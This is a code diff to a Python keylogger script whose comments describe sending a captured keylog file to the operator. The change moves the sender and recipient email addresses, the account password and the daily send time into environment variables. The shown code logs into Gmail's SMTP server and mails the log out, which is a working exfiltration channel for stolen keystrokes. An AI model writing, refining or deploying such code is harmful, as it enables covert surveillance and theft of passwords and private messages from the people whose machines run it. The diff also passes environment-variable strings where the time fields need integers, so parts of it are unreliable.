@@ -6,6 +6,10 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
+from dotenv import load_dotenv
+import os
+
+load_dotenv()
 
 #getting system name
 name = platform.node()
@@ -13,15 +17,15 @@ name = platform.node()
 def setTime(offset):
     x=datetime.today()
     #set time that you want script to send you keylog file
-    y=x.replace(day=x.day+offset, hour=16, minute=30, second=0, microsecond=0)
+    y=x.replace(day=x.day+offset, hour=os.getenv("HOUR"), minute=os.getenv("MINUTE"), second=os.getenv("SECOND"), microsecond=os.getenv("MICROSECOND"))
     delta_t=y-x
     return delta_t
 
 secs=setTime(0).seconds+1
 
 def sendEmail():
-    fromaddr = "YOUR SENDING EMAIL ADDRESS"
-    toaddr = "YOUR RECEIVING EMAIL ADDRESS"
+    fromaddr = os.getenv("SENDING_EMAIL")
+    toaddr = os.getenv("RECEIVING_EMAIL")
  
     msg = MIMEMultipart()
 
@@ -46,7 +50,7 @@ def sendEmail():
     #here using gmail credentials but can replaced for any email provider details
     server = smtplib.SMTP('smtp.gmail.com', 587)
     server.starttls()
-    server.login(fromaddr, "SENDING EMAIL ACCOUNT PASSWORD")
+    server.login(fromaddr, os.getenv("SENDING_EMAIL_PASSWORD"))
     text = msg.as_string()
     server.sendmail(fromaddr, toaddr, text)
     server.quit()
